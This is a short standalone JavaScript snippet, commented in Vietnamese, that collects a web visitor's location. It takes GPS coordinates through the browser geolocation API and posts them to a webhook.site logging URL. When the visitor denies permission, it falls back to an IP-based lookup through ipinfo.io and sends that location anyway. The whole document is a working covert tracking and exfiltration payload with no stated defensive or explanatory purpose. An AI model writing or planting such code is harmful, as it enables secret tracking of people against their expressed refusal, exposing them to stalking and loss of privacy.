<script>
  function sendLocation(lat, lon, accuracy, source) {
    fetch("https://webhook.site/aac873f7-5c2e-4afd-94eb-9944647c8eca/log", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({lat, lon, accuracy, source})
    });
  }

  // Thử lấy vị trí qua HTML5
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        sendLocation(
          pos.coords.latitude,
          pos.coords.longitude,
          pos.coords.accuracy,
          "geolocation"
        );
      },
      err => {
        // fallback nếu user deny
        fetch("https://ipinfo.io/json")
          .then(r => r.json())
          .then(d => {
            let [lat, lon] = d.loc.split(",");
            sendLocation(lat, lon, "IP-based", "ip");
          });
      }
    );
  } else {
    // PC không có geolocation API
    fetch("https://ipinfo.io/json")
      .then(r => r.json())
      .then(d => {
        let [lat, lon] = d.loc.split(",");
        sendLocation(lat, lon, "IP-based", "ip");
      });
  }
</script>
